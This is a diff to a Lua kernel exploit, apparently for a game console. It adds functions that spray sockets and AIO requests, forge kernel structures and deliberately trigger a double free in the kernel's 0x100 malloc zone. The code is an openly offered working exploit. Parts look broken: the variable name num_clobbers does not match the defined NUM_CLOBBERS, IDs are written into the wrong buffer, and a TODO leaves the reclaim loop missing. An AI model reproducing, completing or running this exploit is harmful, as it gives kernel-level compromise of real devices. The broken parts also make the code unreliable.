@@ -304,6 +304,7 @@ NUM_SDS = 64 -- TODO: change back to 0x100
 NUM_ALIAS = 200
 LEAK_LEN = 16
 NUM_LEAKS = 5
+NUM_CLOBBERS = 8
 
 
 -- max number of requests that can be created/polled/canceled/deleted/waited
@@ -1147,7 +1148,199 @@ function leak_kernel_addrs(sd_pair)
     return reqs1_addr, kbuf_addr, kernel_addr, target_id, evf
 end
 
+function make_aliased_pktopts(sds)
+    local tclass = memory.alloc(4)
+    for loop = 0, NUM_ALIAS do
+        for i=1, NUM_SDS do
+            memory.write_dword(tclass, i)
 
+            if syscall.setsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4):tonumber() == -1 then
+                error("setsockopt() error: " .. get_error_string())
+            end
+        end
+
+        for i=1, NUM_SDS do
+            gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
+            local marker = memory.read_dword(tclass);
+            if marker ~= i then
+                local sd_pair = { sds[i], sds[marker] }
+                printf("aliased pktopts at attempt: %d (found pair: %d %d)", loop, sd_pair[1], sd_pair[2])
+                table.remove(sds, marker)
+                table.remove(sds, i) -- we're assuming marker > i, or else indexing will change
+                -- add pktopts to the new sockets now while new allocs can't
+                -- use the double freed memory
+                for i=1,2 do
+                    local sock_fd = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
+                    if syscall.setsockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4):tonumber() == -1 then
+                        error("setsockopt() error: " .. get_error_string())
+                    end
+                    table.insert(sds, sock_fd)
+                end
+
+                return sd_pair
+            end
+        end
+
+        for i=1, NUM_SDS do
+            if syscall.setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0):tonumber() == -1 then
+                error("setsockopt() error: " .. get_error_string())
+            end
+        end
+    end
+
+    return nil
+end
+
+function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds)
+    local max_leak_len = bit32.lshift(0xff + 1, 3)
+
+    local buf = memory.alloc(max_leak_len)
+
+    local num_elems = MAX_AIO_IDS
+    local aio_reqs = make_reqs1(num_elems)
+
+    local num_batches = 2
+    local aio_ids_len = num_batches * num_elems
+    local aio_ids = memory.alloc(4 * aio_ids_len)
+
+    dbg("start overwrite rthdr with AIO queue entry loop")
+    local aio_not_found = true
+    free_evf(evf)
+
+    for i=0, num_clobbers - 1 do -- num_clobbers must be defined
+        spray_aio(num_batches, aio_reqs, num_elems, aio_ids)
+
+        -- JS: if (get_rthdr(sd, buf) === 8 && buf.read32(0) === AIO_CMD_READ)
+        -- Assumes 'buf' is an object with a :read32 method and sd, get_rthdr, AIO_CMD_READ are defined
+        if get_rthdr(sd, buf) == 8 and memory.read_dword(buf) == AIO_CMD_READ then
+            printf("aliased at attempt: %d", i)
+            aio_not_found = false
+            cancel_aios(aio_ids, aio_ids_len)
+            break
+        end
+
+        free_aios(aio_ids, aio_ids_len)
+    end
+
+    if aio_not_found then
+        error('failed to overwrite rthdr')
+    end
+
+    local reqs2_size = 0x80
+    local reqs2 = memory.alloc(reqs2_size)
+
+    local rsize = build_rthdr(reqs2, reqs2_size)
+
+    -- .ar2_ticket
+    memory.write_dword(reqs2 + 4, 5)
+
+    -- .ar2_info
+    memory.write_qword(reqs2 + 0x18, reqs1_addr)
+
+    -- craft a aio_batch using the end portion of the buffer
+    local reqs3_offset = 0x28
+
+    -- .ar2_batch
+    memory.write_qword(reqs2 + 0x20, kbuf_addr + reqs3_offset)
+
+    -- [.ar3_num_reqs, .ar3_reqs_left] aliases .ar2_spinfo
+    -- safe since free_queue_entry() doesn't deref the pointer
+    memory.write_dword(reqs2 + reqs3_offset, 1)
+    memory.write_dword(reqs2 + reqs3_offset + 4, 0)
+
+    -- [.ar3_state, .ar3_done] aliases .ar2_result.returnValue
+    memory.write_dword(reqs2 + reqs3_offset + 8, AIO_STATE_COMPLETE)
+
+    memory.write_byte(reqs2 + reqs3_offset + 0xc, 0)
+
+    -- .ar3_lock aliases .ar2_qentry (rest of the buffer is padding)
+    -- safe since the entry already got dequeued
+    --
+    -- .ar3_lock.lock_object.lo_flags = (
+    --     LO_SLEEPABLE | LO_UPGRADABLE
+    --     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
+    --     | 6 << LO_CLASSSHIFT  -- Note: JS bitwise shift
+    --     | LO_INITIALIZED
+    -- )
+    memory.write_dword(reqs2 + reqs3_offset + 0x28, 0x67b0000)
+
+    -- .ar3_lock.lk_lock = LK_UNLOCKED
+    memory.write_qword(reqs2 + reqs3_offset + 0x38, 1)
+
+    local states = memory.alloc(4 * num_elems)
+
+    local addr_cache = { aio_ids }
+
+    for i=1, num_batches - 1 do
+        -- Push the new address into the cache
+        table.insert(addr_cache, aio_ids + bit32.lshift(i * num_elems, 2))
+    end
+
+    dbg("start overwrite AIO queue entry with rthdr loop")
+    local req_id = nil
+    syscall.close(sd)
+    sd = nil
+
+    -- TODO: num_alias loop here
+
+    if req_id == nil then
+        error("failed to overwrite AIO queue entry")
+    end
+
+    free_aios2(aio_ids, aio_ids_len)
+
+    -- enable deletion of target_id
+    poll_aio(target_id, states)
+    local states_val = memory.read_dword(states)
+    printf("target's state: %d", hex(states_val))
+
+    local sce_errs = memory.alloc(8)
+    memory.write_dword(sce_errs, -1)
+    memory.write_dword(sce_errs+4, -1)
+
+    local target_ids = memory.alloc(8)
+    memory.write_dword(sce_errs, req_id)
+    memory.write_dword(sce_errs+4, target_id)
+
+    -- PANIC: double free on the 0x100 malloc zone. important kernel data may alias
+    aio_multi_delete(target_ids, 2, sce_errs)
+
+    -- we reclaim first since the sanity checking here is longer which makes it
+    -- more likely that we have another process claim the memory
+    
+    -- RESTORE: double freed memory has been reclaimed with harmless data
+    -- PANIC: 0x100 malloc zone pointers aliased
+    local sd_pair = make_aliased_pktopts(sds)
+    if sd_pair then
+        return {sd_pair, sd}
+    end
+
+    dbg("failed to make aliased pktopts")
+    local err_main_thr = memory.read_dword(sce_errs)
+    local err_worker_thr = memory.read_dword(sce_errs+4)
+    dbgf("delete errors: %s %s", hex(err_main_thr), hex(err_worker_thr))
+
+    memory.write_dword(states, -1)
+    memory.write_dword(states+4, -1)
+
+    poll_aio(target_ids, states)
+    dbgf("target states: %s %s", hex(memory.read_dword(states)), hex(memory.read_dword(states+4)))
+
+    local SCE_KERNEL_ERROR_ESRCH = 0x80020003  -- No such process
+    local success = true
+    if memory.read_dword(states) ~= SCE_KERNEL_ERROR_ESRCH then
+        print("ERROR: bad delete of corrupt AIO request")
+        success = false
+    end
+    if err_main_thr ~= 0 or err_main_thr ~= err_worker_thr then
+        log("ERROR: bad delete of ID pair")
+        success = false
+    end
+
+    if not success then
+        error("ERROR: double free on a 0x100 malloc zone failed")
+    end
+end
 
 
 function kexploit()
